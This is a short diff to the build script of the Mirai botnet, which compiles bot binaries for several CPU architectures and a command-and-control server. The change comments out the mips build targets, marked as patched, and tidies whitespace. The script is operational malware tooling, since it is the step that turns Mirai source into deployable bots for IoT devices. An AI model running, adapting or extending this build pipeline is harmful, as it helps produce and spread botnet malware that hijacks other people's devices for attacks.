@@ -14,7 +14,7 @@ if [ $# == 2 ]; then
         FLAGS="-DMIRAI_SSH"
     fi
 else
-    echo "Missing build type." 
+    echo "Missing build type."
     echo "Usage: $0 <debug | release> <telnet | ssh>"
 fi
 
@@ -25,7 +25,7 @@ elif [ "$1" == "release" ]; then
     rm release/miraint.*
     go build -o release/cnc cnc/*.go
     compile_bot i586 mirai.x86 "$FLAGS -DKILLER_REBIND_SSH -static"
-    compile_bot mips mirai.mips "$FLAGS -DKILLER_REBIND_SSH -static"
+#    compile_bot mips mirai.mips "$FLAGS -DKILLER_REBIND_SSH -static" #PATCHED
     compile_bot mipsel mirai.mpsl "$FLAGS -DKILLER_REBIND_SSH -static"
     compile_bot armv4l mirai.arm "$FLAGS -DKILLER_REBIND_SSH -static"
     compile_bot armv5l mirai.arm5n "$FLAGS -DKILLER_REBIND_SSH"
@@ -36,7 +36,7 @@ elif [ "$1" == "release" ]; then
     compile_bot sh4 mirai.sh4 "$FLAGS -DKILLER_REBIND_SSH -static"
 
     compile_bot i586 miraint.x86 "-static"
-    compile_bot mips miraint.mips "-static"
+#    compile_bot mips miraint.mips "-static" #PATCHED
     compile_bot mipsel miraint.mpsl "-static"
     compile_bot armv4l miraint.arm "-static"
     compile_bot armv5l miraint.arm5n " "
